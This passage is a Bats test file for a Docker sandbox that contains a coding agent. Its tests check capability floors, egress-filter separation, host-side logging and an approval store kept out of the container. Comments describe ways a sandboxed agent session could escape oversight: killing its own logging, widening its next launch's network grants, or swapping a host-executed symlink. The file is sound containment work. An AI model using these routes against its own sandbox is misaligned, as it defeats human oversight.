#
# The hook deliberately emits only the session id when the briefing already
# reached the harness another way - written to a file, or passed as an argument
# - and inside a dejima sandbox those variables are set, because that is how
# the session running these tests got its own briefing. So a test that sets
# only DEJIMA=1 is asserting a precondition it has not stated: it passes in CI,
# where the environment is clean, and fails on the machine this project is
# actually worked on. Third time (see .dejima.md), same remedy: state the
# precondition with env -u rather than assuming it.
#
# Extra KEY=VALUE assignments for one call go in as arguments.
sandbox_context() {
    env -u DEJIMA_BRIEFING_VIA_ARGS -u DEJIMA_BRIEFING_FILE \
        -u DEJIMA_BRIEFING_RENDERED DEJIMA=1 "$@" \
        bash "$REPO_ROOT/hooks/sandbox-context.sh"
}

@test "sandbox-context.sh gives the agent its own container ID for dejima-allow" {
    # Agents used to guess their container ID and could hand back another
    # running sandbox's ID, making dejima-allow "succeed" against
    # the wrong container. /etc/hostname inside a container is its real ID.
    grep -q '/etc/hostname' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
    grep -q -- '--container' "$REPO_ROOT/hooks/dejima-briefing-render.sh"
}

@test "bin/dejima-allow ends with a real reachability check, not just config changes" {
    # "It said allowed but the sandbox still can't reach it" was a real
    # failure mode (wrong container targeted / stale address set) - the script
    # must verify from inside the target container and say so definitively.
    grep -q 'connect-timeout' "$REPO_ROOT/bin/dejima-allow"
    grep -q 'Verified:' "$REPO_ROOT/bin/dejima-allow"
    grep -q 'NOT reachable' "$REPO_ROOT/bin/dejima-allow"
}

@test "bin/dejima-allow's multi-container error points at the sandbox's own ID" {
    grep -q '/etc/hostname' "$REPO_ROOT/bin/dejima-allow"
}

@test "bin/dejima-allow --global no longer rewrites config/env" {
    # --global persists to the host-side approval store now (Task 3); the old
    # sed -i rewrite of config/env's ALLOWED_DOMAINS is gone for good.
    run grep -F 'config/env' "$REPO_ROOT/bin/dejima-allow"
    [ "$status" -ne 0 ]
    run grep -F 'sed -i' "$REPO_ROOT/bin/dejima-allow"
    [ "$status" -ne 0 ]
}

@test "bin/dejima scans only the mounted ~/.claude dirs for symlink targets" {
    # A symlink inside one of these has to have its target reachable, or the
    # hook/skill it points at can't run in the container. Top-level files
    # (settings.json, CLAUDE.md, statusline.sh) are staged as copies instead,
    # and Docker resolves any symlink among them when it sets up that mount -
    # so scanning "." as well would mount a whole config checkout read-only
    # into the container for nothing.
    # The scan flag is per directory now, declared by the harness: an entry
    # in hooks/ or skills/ is routinely a link into a dotfiles checkout,
    # while plugins/ is bookkeeping the harness writes for itself.
    local dirs d
    dirs="$(_declared_config_dirs)"
    for d in hooks skills commands agents output-styles; do
        grep -q "^/h/.claude/$d"$'\t'"ro"$'\t'"scan" <<< "$dirs" \
            || { echo "$d is not scanned for symlink targets: $dirs"; return 1; }
    done
    grep -q "^/h/.claude/plugins" <<< "$dirs" \
        && { echo "plugins is not a config-dir mount any more: $dirs"; return 1; }
    grep -q 'mounted_scan' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima stages ~/.claude/statusline.sh for copying, when present" {
    # settings.json's statusLine.command points at it and Claude Code
    # executes it on the host, so it's the same class of file as the config
    # staged at /etc/dejima-claude by docker-compose.yml, and staged the same
    # way. A read-only mount at its real path protected only the
    # plain-regular-file case: when statusline.sh is itself a symlink (the
    # common case, into a dotfiles checkout), bind-mount destination
    # resolution followed it, so the mount landed on the target and left the
    # symlink dentry writable and replaceable. Docker resolves that symlink
    # when it sets up the staging mount instead, so what entrypoint.sh copies
    # in is the real content at a path nothing on the host can reach. Still
    # conditional on existence: not every host has a statusline, and mounting
    # a nonexistent source would make Docker create a root-owned directory at
    # the target instead.
    # Declared by the harness with the rest of its staged config, and mounted
    # into the staging tree by core.
    grep -q 'emit_staged_config "$HOME/.claude/statusline.sh" ".claude/statusline.sh"' \
        "$REPO_ROOT/bin/harness/claude-code.sh"
    grep -q 'extra_mounts+=(-v "$_ssrc:/etc/dejima-harness/$_srel:ro")' "$REPO_ROOT/bin/dejima"
    # Executable staged files land executable; that distinction is what the
    # 555 used to encode, and it is now read from the source rather than
    # hardcoded per filename.
    grep -q 'install -o root -g root -m 555' "$SANDBOX_DIR/entrypoint.sh"
    run grep -F 'extra_mounts+=(-v "$HOME/.claude/statusline.sh:$HOME/.claude/statusline.sh' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ]
}

@test "bin/dejima refuses to launch rather than silently skip a dangling statusline.sh symlink" {
    # Plain -e follows symlinks and is false for a *dangling* one (target
    # doesn't exist, e.g. a dotfiles checkout that isn't present) - silently
    # skipping the mount in that case would reopen the exact gap the test
    # above closes. Docker also can't just attempt the mount anyway: it fails
    # deep in mount setup with an opaque "mkdir ...: file exists" (the
    # symlink already occupies that path), unconnected to the statusline for
    # the user. So this must be a hard, explicit error - same fail-loud
    # precedent as the credential proxy refusing to launch rather than
    # silently mounting the real OAuth credential.
    # The check is core's, over every staged file the harness declares - a
    # plugin filtering on existence itself would skip a dangling one silently,
    # which is the case this refuses for.
    grep -q 'if \[ -L "\$_ssrc" \] && \[ ! -e "\$_ssrc" \]' "$REPO_ROOT/bin/dejima"
    grep -q "Docker can't bind-mount a dangling symlink" "$REPO_ROOT/bin/dejima"
    run grep -n '\[ -e "\$HOME/\.claude/\$f" \]' "$REPO_ROOT/bin/harness/claude-code.sh"
    [ "$status" -ne 0 ] || { echo "the plugin filters on existence, hiding a dangling symlink"; return 1; }
}

@test "bin/dejima-audit monitors the home-level ~/.claude/statusline.sh (Finding 1 compensating control)" {
    # Staging it (the test above) is what actually closes the symlink gap the
    # old read-only mount left open; this stays as defence in depth, since a
    # session reaching the host statusline by some other route is exactly the
    # kind of thing an exit-time audit exists to surface. Full behavioral
    # coverage (snapshot/compare
    # against real fixtures, including the symlink-swap exploit) lives in
    # test/audit.bats; this just confirms the wiring exists.
    # The path and its label are the harness plugin's now; the mechanism
    # that snapshots and reports them is still the audit's.
    grep -q 'host_exec_snapshot' "$REPO_ROOT/bin/dejima-audit"
    grep -q 'host_exec_load' "$REPO_ROOT/bin/dejima-audit"
    grep -q 'statusline_path' "$REPO_ROOT/bin/harness/claude-code.sh"
    grep -q 'HOST-CODE-EXECUTION' "$REPO_ROOT/bin/harness/claude-code.sh"
}

@test "Dockerfile installs the sandbox clipboard fallback into nvim's VIMRUNTIME plugin dir" {
    # $VIMRUNTIME/plugin, NOT /etc/xdg/nvim: lazy.nvim's performance.rtp
    # reset strips /etc/xdg from the runtimepath, but always keeps
    # $VIMRUNTIME - this must load for lazy-managed configs too.
    grep -q 'COPY docker/sandbox-clipboard.lua /usr/local/share/nvim/runtime/plugin/sandbox-clipboard.lua' "$SANDBOX_DIR/Dockerfile"
}

@test "conversation shipping is opt-in, and runs on the host rather than in the session" {
    # It reads transcripts that are bind-mounted from the host, so it never
    # needed to be inside - and being inside put it in a process the session
    # shared a filesystem and a signal namespace with, where killing it
    # ended its own logging with nothing on the host noticing.
    grep -q 'config_get_bool logging conversation' "$REPO_ROOT/bin/dejima-conversation-ship"
    grep -q 'exit 0' "$REPO_ROOT/bin/dejima-conversation-ship"
    # Gone from the container entirely: the shipper there no longer reads
    # anything the session writes.
    run grep -n 'SANDBOX_LOG_CONVERSATION\|watch_transcripts\|transform_transcript' \
        "$SANDBOX_DIR/log-shipper.sh" "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ] || { echo "conversation shipping is still in the container:"; echo "$output"; return 1; }
    # And stopped before the exit-time audit, so the last lines a session
    # produced are shipped rather than discarded with the batch.
    local ship_line audit_line
    ship_line=$(grep -n 'SANDBOX_CONVERSATION_SHIP_PID' "$REPO_ROOT/bin/dejima" | sed -n '2p' | cut -d: -f1)
    audit_line=$(grep -n 'dejima-audit" compare' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    [ "$ship_line" -lt "$audit_line" ]
}

@test "the transcript transform ships prompts/responses/tool commands, skips results/meta/thinking" {
    fixtures='{"type":"user","sessionId":"s1","isMeta":null,"message":{"role":"user","content":"fix the login bug"}}
{"type":"user","sessionId":"s1","isMeta":true,"message":{"role":"user","content":"meta noise"}}
{"type":"user","sessionId":"s1","message":{"role":"user","content":[{"type":"tool_result","content":"tool output secret"}]}}
{"type":"assistant","sessionId":"s1","message":{"content":[{"type":"thinking","thinking":"hidden reasoning"},{"type":"text","text":"done, deployed the fix"},{"type":"tool_use","name":"Bash","input":{"command":"ls -la"}}]}}
this line is not json'
    # The transform is the harness's - it is a fact about that harness's
    # transcript format - so it lives in the plugin now. What it must and
    # must not ship is unchanged.
    run bash -c "
        source '$REPO_ROOT/bin/dejima-provider-lib.sh'
        source '$REPO_ROOT/bin/dejima-harness-lib.sh'
        harness_plugin_load claude-code
        harness_transform_transcript <<< \"\$1\"" _ "$fixtures"
    [ "$status" -eq 0 ]
    [[ "$output" == *'"role":"user"'* ]]
    [[ "$output" == *"fix the login bug"* ]]
    [[ "$output" == *'"role":"assistant"'* ]]
    [[ "$output" == *"done, deployed the fix"* ]]
    [[ "$output" == *'"role":"tool"'* ]]
    [[ "$output" == *'ls -la'* ]]
    [[ "$output" != *"meta noise"* ]]
    [[ "$output" != *"tool output secret"* ]]
    [[ "$output" != *"hidden reasoning"* ]]
    [[ "$output" != *"not json"* ]]
}

# runtime.bats names its container and network after the run, and both
# properties it needs pull in opposite directions: unique ACROSS runs, so a
# leftover from one cannot be adopted or destroyed by the next, and stable
# WITHIN a run, so setup_file, every test and teardown_file all mean the same
# container.
#
# BATS_FILE_TMPDIR looks like it gives both and gives only the second: its path
# is unique but its basename is the file's index, `0` for the only file there.
# That made the names the constants dejima-test-0 and dejima-test-net-0 in
# every run ever, until a killed run left dejima-test-net-0 with a container
# attached and every later run died in setup_file on "already exists".
@test "runtime.bats derives its container and network names from the run, not the file index" {
    local rt="$REPO_ROOT/test/runtime.bats"
    run grep -nE '^(container|network)_name\(\)' "$rt"
    [ "$status" -eq 0 ] || { echo "the name helpers are gone"; return 1; }
    # Both derive from BATS_RUN_TMPDIR, whose basename is the per-run
    # bats-run-XXXXXX.
    local n
    n=$(grep -cE '^(container|network)_name\(\).*BATS_RUN_TMPDIR' "$rt")
    [ "$n" -eq 2 ] || { echo "expected 2 helpers keyed on BATS_RUN_TMPDIR, found $n"; return 1; }
    run grep -nE '^(container|network)_name\(\).*BATS_FILE_TMPDIR' "$rt"
    [ "$status" -ne 0 ] || {
        echo "a name helper is back on BATS_FILE_TMPDIR, whose basename is always 0:" >&2
        echo "$output" >&2
        return 1
    }
    # And the property itself, rather than only the variable it comes from: two
    # runs of the same helper text must not agree.
    local probe first second
    probe="$(mktemp "$BATS_TEST_TMPDIR/probe.XXXXXX.bats")"
    {
        grep -E '^network_name\(\)' "$rt"
        echo '@test "n" { echo "NAME=$(network_name)" >&3; }'
    } > "$probe"
    first="$(bats "$probe" 2>&1 | sed -n 's/.*NAME=//p')"
    second="$(bats "$probe" 2>&1 | sed -n 's/.*NAME=//p')"
    [ -n "$first" ] || { echo "the probe produced no name"; return 1; }
    [ "$first" != "$second" ] || {
        echo "two separate runs produced the same network name: $first" >&2
        echo "a leftover from one run would collide with the next" >&2
        return 1
    }
}

# The sweep in setup_file runs between `container=$(container_name)` and the
# `docker run --name "$container"` that uses it. A loop variable named
# `container` there leaves $container holding the last endpoint the sweep saw,
# and every container this file starts is then named after someone else's
# leftover - a failure that appears only once there is something to reap,
# which is to say only when the sweep matters.
#
# Run against a fake docker that reports a stale attached network, because
# that is the branch where the assignment happens; a clean host never enters
# it and the bug stays invisible.
@test "runtime.bats' cleanup sweep does not clobber the names setup_file built" {
    local rt="$REPO_ROOT/test/runtime.bats" d
    d="$BATS_TEST_TMPDIR/sweep"
    mkdir -p "$d/stub"
    cat > "$d/stub/docker" <<'STUB'
#!/bin/bash
case "$1 $2" in
    "network ls")      echo dejima-test-net-abandoned ;;
    "network rm")      exit 1 ;;
    "network inspect")
        case "$*" in
            *Created*)    echo "2020-01-01T00:00:00Z" ;;
            *Containers*) printf 'dejima-test-abandoned\n' ;;
        esac ;;
    "inspect -f")      echo "2020-01-01T00:00:00Z" ;;
    "ps -a")           echo dejima-test-abandoned ;;
esac
exit 0
STUB
    chmod +x "$d/stub/docker"

    # The sweep exactly as it appears in setup_file, with the surrounding
    # values it depends on supplied.
    sed -n '/^    local _stale _age _endpoint _dead _created$/,/--format .{{.Names}}. 2>\/dev\/null)$/p' \
        "$rt" | sed 's/^    //' > "$d/sweep.sh"
    [ -s "$d/sweep.sh" ] || { echo "could not extract the sweep from setup_file"; return 1; }

    run env PATH="$d/stub:$PATH" bash -c '
        container="the-name-setup_file-built"
        network="dejima-test-net-mine"
        REAP_AFTER=1
        source "$1"
        printf "container=%s\n" "$container"
        printf "network=%s\n" "$network"' _ "$d/sweep.sh"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"container=the-name-setup_file-built"* ]] || {
        echo "the sweep clobbered \$container:" >&2; echo "$output" >&2; return 1; }
    [[ "$output" == *"network=dejima-test-net-mine"* ]] || {
        echo "the sweep clobbered \$network:" >&2; echo "$output" >&2; return 1; }
}

# A network left behind by a killed run keeps its container attached, so
# `docker network rm` cannot remove it and `docker network create` then fails
# on the name - on a long-lived privileged runner, for every run afterwards.
@test "runtime.bats clears a stale network of its own before creating one" {
    local rt="$REPO_ROOT/test/runtime.bats"
    # Scoped to this suite's own prefix: it may clear its namespace and
    # nothing else.
    grep -q 'name=\^dejima-test-net-' "$rt" \
        || { echo "the sweep is not scoped to the dejima-test-net- prefix"; return 1; }
    # And it must come before the create, or it clears nothing in time.
    local sweep create
    sweep=$(grep -n 'name=\^dejima-test-net-' "$rt" | head -1 | cut -d: -f1)
    create=$(grep -n 'docker network create' "$rt" | head -1 | cut -d: -f1)
    [ "$sweep" -lt "$create" ] \
        || { echo "the sweep at line $sweep runs after the create at line $create"; return 1; }
    # A network still attached is either this suite's abandoned leftover or a
    # concurrent run's live one, and nothing distinguishes them by inspection.
    # Age does, so the reap has to be guarded by it - without that, a run on
    # the same host gets its container pulled out from under it.
    grep -q 'REAP_AFTER' "$rt" \
        || { echo "attached networks are reaped with no age guard"; return 1; }
    # And the guard has to be longer than a real run of this file.
    local reap
    reap=$(sed -n 's/^REAP_AFTER=\$((\(.*\)))$/\1/p' "$rt")
    [ -n "$reap" ] || { echo "REAP_AFTER is not a plain arithmetic constant"; return 1; }
    [ "$((reap))" -ge 3600 ] \
        || { echo "REAP_AFTER is $((reap))s, short enough to hit a live run"; return 1; }
}

@test "runtime.bats reaps its own abandoned images, not just its containers" {
    # Networks and containers were reaped across runs; images were not (#26).
    # The per-test teardown removes only the current run's suffix, so a run
    # that never reaches teardown leaves harness, override and derived images
    # with nothing that will ever collect them - and each is built FROM the
    # session image, so they are the largest thing this suite leaves behind.
    #
    # Asserted on the source: this file cannot run Docker, and the alternative
    # is that the only check on the reap is a suite that never runs here.
    local rt="$REPO_ROOT/test/runtime.bats"
    local reap create
    reap=$(grep -n 'docker rmi -f "\$_img"' "$rt" | head -1 | cut -d: -f1)
    [ -n "$reap" ] || { echo "no image reap in runtime.bats"; return 1; }
    # In setup_file, before the run makes anything - a sweep after the build
    # is a sweep of this run's own work.
    create=$(grep -n 'docker network create' "$rt" | head -1 | cut -d: -f1)
    [ "$reap" -lt "$create" ] \
        || { echo "the image reap at $reap runs after the create at $create"; return 1; }
    # Scoped to this suite's namespace, checked on the name rather than left
    # to the CLI filter.
    # Anchored on the name in the shell rather than left to the CLI filter,
    # and matching both spellings so the reap does not depend on landing
    # before or after the rename to localhost/ (#53).
    local window
    window="$(sed -n "$((reap - 16)),${reap}p" "$rt")"
    grep -q 'dejima-test-\*|localhost/dejima-test-\*)' <<< "$window" \
        || { echo "the image reap is not anchored to both dejima-test- spellings"; return 1; }
    # And age-guarded, or a concurrent run loses the image it is booting.
    grep -q 'REAP_AFTER' <<< "$window" \
        || { echo "images are reaped with no age guard"; return 1; }
}

@test "every container runtime.bats starts is attached to a user-defined network" {
    # On the default bridge there's no 127.0.0.11, so the policy aborts and
    # the container dies mid-startup - which used to surface as flaky,
    # sometimes vacuous tests rather than an obvious failure. See runtime.bats'
    # wait_ready comment.
    # Detached and foreground starts both count - the transport test runs its
    # container in the foreground, to read the container's own streams rather
    # than the daemon's log driver (see its comment), and it needs a network
    # every bit as much as the detached ones.
    #
    # Exempted: runs that replace the entrypoint with a plain shell. Those
    # never reach the resolver, so there is nothing for it to be
    # missing from - the image/checkout comparison in setup_file is one, and it
    # only runs md5sum.
    local runs networks
    runs=$(grep -E '^\s*(run timeout [0-9]+ )?docker run ' "$REPO_ROOT/test/runtime.bats" \
        | grep -vc -- '--entrypoint sh')
    networks=$(grep -cE '^\s*--network ' "$REPO_ROOT/test/runtime.bats")
    [ "$runs" -gt 0 ]
    [ "$runs" -eq "$networks" ] || {
        echo "$runs container starts that run the real entrypoint, but $networks --network flags" >&2
        false
    }
}

@test "runtime.bats readiness waits for the final sleep infinity, not any startup sleep" {
    # A bare `pgrep -x sleep` also matches the policy's own retry sleeps and
    # entrypoint.sh's forwarder-bind sleep, both of which run before
    # the egress policy has installed anything - asserting there would find
    # an open namespace, passing egress tests for the wrong reason.
    grep -qF "pgrep -x -f 'sleep infinity'" "$REPO_ROOT/test/runtime.bats"
    run grep -nE 'docker exec.*pgrep -x sleep' "$REPO_ROOT/test/runtime.bats"
    [ "$status" -ne 0 ]
}

@test "dejima-allow has no env-triggered path that skips the live session" {
    # DEJIMA_ALLOW_SKIP_SESSION used to exist as a test-only escape hatch, and
    # by the end was consulted by nothing: every caller passed --project or
    # --global, which set session_wanted=0 on their own. An environment
    # variable that turns a firewall CLI into a silent no-op is worth keeping
    # out on purpose, not just deleting once - which is what this pins.
    # Matched on the read and the write, not the bare name: both files below
    # still name it in a comment explaining why it is gone, and a grep that
    # tripped on its own rationale would have to be deleted to pass.
    run grep -n '\${\?DEJIMA_ALLOW_SKIP_SESSION' "$REPO_ROOT/bin/dejima-allow"
    [ "$status" -ne 0 ]
    run grep -rn --exclude=static.bats 'DEJIMA_ALLOW_SKIP_SESSION=' \
        "$REPO_ROOT/test" "$REPO_ROOT/README.md"
    [ "$status" -ne 0 ]
}

@test "dejima-allow's usage puts the domain last" {
    grep -q 'Usage: dejima-allow \[--global\] \[--project \[path\]\] \[--container <id>\] <domain>' \
        "$REPO_ROOT/bin/dejima-allow"
}

@test "bin/dejima merges approved project domains into ALLOWED_DOMAINS" {
    grep -q 'dejima-project-lib.sh' "$REPO_ROOT/bin/dejima"
    grep -q 'resolve_project_store "$WORKSPACE_DIR"' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima never reads a declaration file as a grant" {
    # .dejima/ in the workspace is session-writable. It may only be
    # read by the reporting/approval path, never by the launcher deciding
    # what to allow.
    run grep -n '\.dejima/' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ]
}

@test "docker-compose.yml image honors SANDBOX_IMAGE with today's default" {
    grep -qE '^\s*image:\s*\$\{SANDBOX_IMAGE:-localhost/dejima:\$\{SANDBOX_USER:-node\}\}\s*$' \
        "$SANDBOX_DIR/docker-compose.yml"
}

@test "every image dejima builds is named under a registry that is not Docker Hub" {
    # A bare `dejima:node` is `docker.io/library/dejima:node` to anything that
    # pushes it, and none of these images is meant to leave the host that built
    # them (#53). Docker reads a first component of exactly `localhost`, or one
    # containing a dot or a colon, as a registry host - so the prefix is what
    # makes a stray `docker push` fail locally instead of reaching Hub.
    #
    # Pulling is untouched and deliberate: the base image is on Hub, which is
    # where `node:22` lives, and mirroring that needs a registry the operator
    # runs. This is about what dejima names, not what it fetches.
    local repo
    repo=$(sed -n 's/^SANDBOX_IMAGE_REPO="\(.*\)"$/\1/p' "$REPO_ROOT/bin/dejima")
    [ -n "$repo" ] || { echo "bin/dejima has no SANDBOX_IMAGE_REPO"; return 1; }
    case "$repo" in
        localhost/?*|*.*/?*|*:*/?*) ;;
        *) echo "SANDBOX_IMAGE_REPO='$repo' would resolve to Docker Hub"; return 1 ;;
    esac

    # And nothing names an image around it. One prefix is only worth having if
    # it is the only way a tag gets made, so this looks for the shape of a tag
    # rather than for the names that exist today.
    local hit
    # Searched across the repo rather than against a list of files. The first
    # version of this named bin/dejima, docker-compose.yml and runtime.bats,
    # and the workflow's own `docker build -t dejima:latest` was not among
    # them - so the invariant passed here and the privileged job failed on a
    # tag that did not exist. A list of files is a list of the places someone
    # already thought of.
    hit=$(grep -rnE '(-t |tag=|image: |IMAGE=)[^ ]*\bdejima[a-z-]*:' \
              --include='*.sh' --include='*.yml' --include='*.bats' \
              --include='Dockerfile*' --include='dejima*' \
              --exclude-dir=.git --exclude-dir=.worktrees --exclude-dir=node_modules \
              "$REPO_ROOT" \
          | grep -v 'localhost/' \
          | grep -v 'SANDBOX_IMAGE_REPO' \
          | grep -v '/test/static.bats:' || true)
    [ -z "$hit" ] || { echo "these name an image that resolves to Hub:"; echo "$hit"; return 1; }
}

@test "bin/dejima explicitly builds the base image, pinned to the base tag on that exact line" {
    # docker-compose.yml's image: now honors $SANDBOX_IMAGE (see the test
    # above), so an unpinned `compose build claude` would inherit whatever
    # $SANDBOX_IMAGE happens to be in the caller's environment - e.g. a
    # derived tag left over from a previous project session - and rebuild
    # the base Dockerfile under that name instead of the base tag. Anchored
    # to the line immediately before the build invocation itself: the
    # fallback `SANDBOX_IMAGE="${SANDBOX_IMAGE_REPO}:${SANDBOX_USER}"` assignment a
    # couple of lines later would satisfy a looser "does the pin appear
    # anywhere in the file" check just as well, without actually applying to
    # this build.
    local build_line
    build_line=$(grep -n 'docker compose -f "\$COMPOSE_FILE" build sandbox' "$REPO_ROOT/bin/dejima" | cut -d: -f1)
    [ -n "$build_line" ]
    run sed -n "$((build_line - 1))p" "$REPO_ROOT/bin/dejima"
    [[ "$output" == 'SANDBOX_IMAGE="${SANDBOX_IMAGE_REPO}:${SANDBOX_USER}" \' ]]
}

@test "the derived image build never uses the workspace as its build context" {
    # A root-context build with the untrusted project as context would let a
    # session's own files influence the image it then runs in.
    run grep -n 'docker build.*"\$WORKSPACE_DIR"' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ]
    grep -q 'SANDBOX_DERIVED_CONTEXT' "$REPO_ROOT/bin/dejima"
}

@test "the global dependency layer is built under the -global tag, guarded by the global store" {
    # Anchored to the line immediately before the call: a file-wide grep for
    # the guard or the tag alone would pass even if they'd drifted apart.
    local call_line
    call_line=$(grep -n 'build_dep_layer "\${SANDBOX_IMAGE_REPO}:\${SANDBOX_USER}-global"' "$REPO_ROOT/bin/dejima" | cut -d: -f1)
    [ -n "$call_line" ]
    run sed -n "$((call_line - 1))p" "$REPO_ROOT/bin/dejima"
    [[ "$output" == 'if [ -s "$(config_root)/dependencies" ]; then' ]]
}

@test "build_dep_layer advances SANDBOX_IMAGE to the tag it just built" {
    # Without this, the second call in a global+project build would build the
    # project layer FROM the base image instead of FROM the global layer.
    grep -q 'SANDBOX_IMAGE="\$tag"' "$REPO_ROOT/bin/dejima"
}

@test "the project dependency layer is still guarded by a non-empty PROJECT_STORE" {
    local call_line
    call_line=$(grep -n 'build_dep_layer "\${SANDBOX_IMAGE_REPO}:\${SANDBOX_USER}-\$(project_slug' "$REPO_ROOT/bin/dejima" | cut -d: -f1)
    [ -n "$call_line" ]
    run sed -n "$((call_line - 1))p" "$REPO_ROOT/bin/dejima"
    [[ "$output" == 'if [ -n "$PROJECT_STORE" ] && [ -s "$PROJECT_STORE/dependencies" ]; then' ]]
}

@test "the container declares a capability floor rather than the default set" {
    # Docker's default carries about fourteen capabilities for the root phase
    # and the entrypoint uses six. Asserted here as a declaration, and in
    # runtime.bats as a property of a container that actually came up - this
    # half is what fails fast in a sandbox where nothing can be booted.
    local c="$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*cap_drop:' "$c" || { echo "no cap_drop; the default set is back"; return 1; }
    grep -qE '^\s*- ALL\s*$' "$c" || { echo "cap_drop does not drop ALL"; return 1; }
    grep -qE '^\s*- no-new-privileges:true\s*$' "$c" \
        || { echo "no-new-privileges is gone"; return 1; }
    # SETPCAP is declared, and it is the one whose use is not a line of the
    # startup sequence: it is spent taking the rest of this list away again
    # before the session starts. Declared without that, it is a capability
    # nothing uses - so the two are asserted together, in both directions.
    grep -qE '^\s*- SETPCAP\s*$' "$c" \
        || { echo "SETPCAP is gone, so the bounding set cannot be emptied"; return 1; }
    grep -q 'exec capsh --drop=all' "$SANDBOX_DIR/caps-lib.sh" \
        || { echo "SETPCAP is declared but nothing drops with it"; return 1; }

    # And nothing the entrypoint does not use has been added back.
    local cap
    for cap in SYS_ADMIN MKNOD SETFCAP SYS_CHROOT SYS_PTRACE; do
        run grep -nE "^\s*- $cap\s*$" "$c"
        [ "$status" -ne 0 ] || { echo "$cap is declared and nothing uses it"; return 1; }
    done
}

@test "the session container declares no network capability, and the filter declares them" {
    # The arrangement's whole point, asserted where each list is written.
    # Capabilities are per process, so a session container that declares
    # NET_ADMIN can alter the filter bounding it however carefully everything
    # else is arranged - and would do so silently, since the launch keeps
    # working either way.
    #
    # KILL is NOT in this list, and that is the point of the exception: the
    # filter container needs it for dnsmasq, and the session container needs it
    # for tini, which forwards signals to a child whose uid it does not match.
    # Removing it from here once already shipped a session that died on a
    # terminal resize.
    #
    # Both directions for each, or "the session declares none of them" is
    # satisfied just as well by a launch with no filter container to hold them.
    local c="$SANDBOX_DIR/docker-compose.yml" cap
    for cap in NET_ADMIN NET_RAW; do
        run grep -nE "^\s*- $cap\s*$" "$c"
        [ "$status" -ne 0 ] \
            || { echo "the session container declares $cap, so it can reach the filter"; return 1; }
        grep -q -- "--cap-add $cap" "$REPO_ROOT/bin/dejima" \
            || { echo "$cap left the session container without arriving at the filter"; return 1; }
    done

    # KILL is the exception, declared on both: tini needs it here to forward a
    # signal to the session, dnsmasq needs it there to be signalled.
    grep -qE '^\s*- KILL\s*$' "$c" \
        || { echo "the session container cannot signal its own session - see tini"; return 1; }
    grep -q -- '--cap-add KILL' "$REPO_ROOT/bin/dejima" \
        || { echo "the filter container cannot signal dnsmasq"; return 1; }

    # The same split for the one sysctl: a property of a namespace the session
    # container does not own, so it is set by the container that does.
    run grep -nE '^\s*sysctls:' "$c"
    [ "$status" -ne 0 ] \
        || { echo "the session container declares a sysctl for a namespace it does not own"; return 1; }
    grep -q -- '--sysctl net.ipv4.ip_unprivileged_port_start=0' "$REPO_ROOT/bin/dejima" \
        || { echo "nothing sets the unprivileged port floor the TLS terminator needs"; return 1; }
}

@test "the runtime suite's containers read both capability floors rather than copying them" {
    # start_pair builds the pair a launch actually starts, so it is where both
    # floors have to come from the code that declares each: the session's from
    # docker-compose.yml, the filter's from bin/dejima's own `docker run`. A
    # hand-written list in either place would drift, and the containers under
    # test would stop being the containers a launch gets.
    #
    # The suite still starts two containers by hand - one that must refuse to
    # start, one that must abort at a check before the network matters. Both
    # say so at the call site; neither stands in for a session.
    local rt="$REPO_ROOT/test/runtime.bats"
    grep -q '^compose_cap_add()' "$rt" \
        || { echo "runtime.bats no longer derives the session capability list"; return 1; }
    grep -q '^launcher_filter_cap_add()' "$rt" \
        || { echo "runtime.bats no longer derives the filter capability list"; return 1; }

    local pair
    pair="$(sed -n '/^start_pair()/,/^}/p' "$rt")"
    [ -n "$pair" ] || { echo "no start_pair in runtime.bats"; return 1; }
    grep -q 'compose_cap_add' <<< "$pair" \
        || { echo "the session container no longer derives its capabilities"; return 1; }
    grep -q 'launcher_filter_cap_add' <<< "$pair" \
        || { echo "the filter container no longer derives its capabilities"; return 1; }

    # Both halves, twice each: an empty set to start from, and no way back up.
    [ "$(grep -c -- '--cap-drop=ALL' <<< "$pair")" = 2 ] \
        || { echo "a container in the pair does not start from an empty set"; return 1; }
    [ "$(grep -c -- '--security-opt=no-new-privileges:true' <<< "$pair")" = 2 ] \
        || { echo "a container in the pair runs without no-new-privileges"; return 1; }

    run grep -nE -- '--cap-add=(NET_ADMIN|NET_RAW|CHOWN|SETUID)' <<< "$pair"
    [ "$status" -ne 0 ] \
        || { echo "a capability is hardcoded in the pair:"; echo "$output"; return 1; }

    # And the fixture that stands in for a session goes through it, or the
    # derivation above is true of a helper nothing calls.
    local setup_block
    setup_block="$(sed -n '/^setup_file()/,/^}/p' "$rt")"
    grep -q 'start_pair ""' <<< "$setup_block" \
        || { echo "setup_file no longer starts the pair a launch starts"; return 1; }
}

@test "dejima writes host state under one root, not a new base directory per file" {
    # The update check put its cache under XDG_STATE_HOME, which is where the
    # spec says a throwaway timestamp goes - and made ~/.local/state a fifth
    # place dejima writes, for one file, created by mkdir -p on hosts with no
    # other use for it. Everything durable dejima keeps is under
    # ~/.local/share/dejima or ~/.config/dejima; the runtime registry is the
    # one deliberate exception, and it is not durable.
    # Code, not comments: _cache_file's own comment says what it moved away
    # from and why, and a grep that counted that would fail on the fix.
    local f hit=""
    for f in "$REPO_ROOT"/bin/*; do
        [ -f "$f" ] || continue
        grep -v '^[[:space:]]*#' "$f" \
            | grep -q 'XDG_STATE_HOME\|\.local/state' && hit="$hit $(basename "$f")"
    done
    [ -z "$hit" ] || { echo "a new state root is back in:$hit"; return 1; }
}

@test "the approval store is never mounted into the container" {
    # The store is the only thing that actually grants anything, and the
    # container runs an agent with no tool-use confirmations - mounting it
    # anywhere, at any mode, would let a session widen its own next launch
    # (a read-only mount still leaks every other project's approvals).
    run grep -nE 'config/dejima|DEJIMA_CONFIG_DIR|PROJECT_STORE' \
        "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
    run grep -nE '^\s*extra_mounts\+=.*(PROJECT_STORE|config_root)' "$REPO_ROOT/bin/dejima"
    [ "$status" -ne 0 ]
    # Both greps are literal, so neither can see a mount whose path is
    # computed at run time - and two of those reached the store (#15): a
